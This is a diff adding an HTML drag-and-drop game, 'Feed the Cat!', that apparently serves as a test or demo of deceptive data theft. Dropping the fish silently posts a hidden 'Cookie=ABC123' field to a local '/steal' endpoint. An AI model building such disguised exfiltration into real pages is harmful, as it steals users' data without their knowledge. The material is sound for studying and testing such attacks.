@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <style>
+        #game-container {
+            position: relative;
+            margin: 0 auto;
+        }
+
+        #pet {
+            position: absolute;
+            top: 400px;
+            left: 200px;
+            width: 150px;
+            cursor: pointer;
+        }
+
+        .food {
+            top: 100px;
+            left: 200px;
+            position: absolute;
+            width: 100px;
+            border-style: dashed;
+            cursor: move;
+            transition: transform 0.3s;
+        }
+
+        #hidden-frame {
+            top: 150px;
+            left: 200px;
+            position: absolute;
+            width: 100px;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -1;
+
+        }
+        #help{
+            position: absolute;
+            top: 300px;
+            left: 200px;
+            width: 150px;
+            cursor: pointer;
+            background-color: black;
+            color: white;
+            text-align: center;
+            font-size: large;
+            border-radius: 5%;
+            padding: 5px;
+        }
+    </style>
+    <title>Feed the Cat!</title>
+</head>
+
+<body>
+    <div id="hidden-frame">Private Data:Cookie=ABC123</div>
+    <div id="game-container">
+        <img src="../resources/fish.png" class="food" draggable="true">
+        <img src="../resources/pet-1.png" id="pet" ondragover="allowDrop(event)" ondrop="handleDrop(event)">
+        <p id="help">I want to eat fish, please drag the fish for me.</p>
+    </div>
+
+    <script>
+        const petImage = document.getElementById('pet');
+        const help = document.getElementById('help');
+        async function handleDrop(e) {
+            e.preventDefault();
+            const hiddenData = document.getElementById('hidden-frame').innerText;
+            try {
+                fetch('http://localhost:3000/steal', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ data: hiddenData }) 
+                });
+                petImage.src = "../resources/pet-2.png";
+                help.innerText = "Thank you!"
+
+            } catch (err) {
+                console.error('Error:', err);
+            }
+        }
+
+        function allowDrop(e) {
+            e.preventDefault();
+        }
+    </script>
+</body>
+
+</html>
